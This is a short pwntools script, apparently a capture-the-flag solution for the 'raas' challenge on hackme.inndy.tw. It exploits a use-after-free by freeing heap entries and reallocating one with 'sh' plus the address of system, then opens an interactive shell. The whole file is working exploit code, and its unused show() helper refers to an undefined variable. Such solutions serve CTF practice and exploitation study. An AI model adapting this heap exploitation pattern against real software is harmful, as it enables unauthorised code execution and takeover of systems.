from pwn import *

elf = ELF("./raas")
conn = remote("hackme.inndy.tw",7719) 

def new(index, type, value, length = 0):
    conn.sendlineafter('Act > ', '1')
    conn.sendlineafter('Index > ',str(index))
    conn.sendlineafter('Type > ', str(type))
    if type == 2:
        conn.sendlineafter('Length > ', str(length))
    conn.sendlineafter('Value > ', str(value))

def delete(index):
    conn.sendlineafter('Act > ','2' )
    conn.sendlineafter('Index > ',str(index))

def show():
    conn.sendlineafter('Act > ','3')
    conn.sendlineafter('Index > ',str(index))

new(0,1,1)
new(1,2,'aaaa',0x10)
delete(1)
delete(0)

sys_plt = elf.plt['system']

new(2,2,'sh\x00\x00' + p32(sys_plt),0xc)

delete(1)

conn.interactive()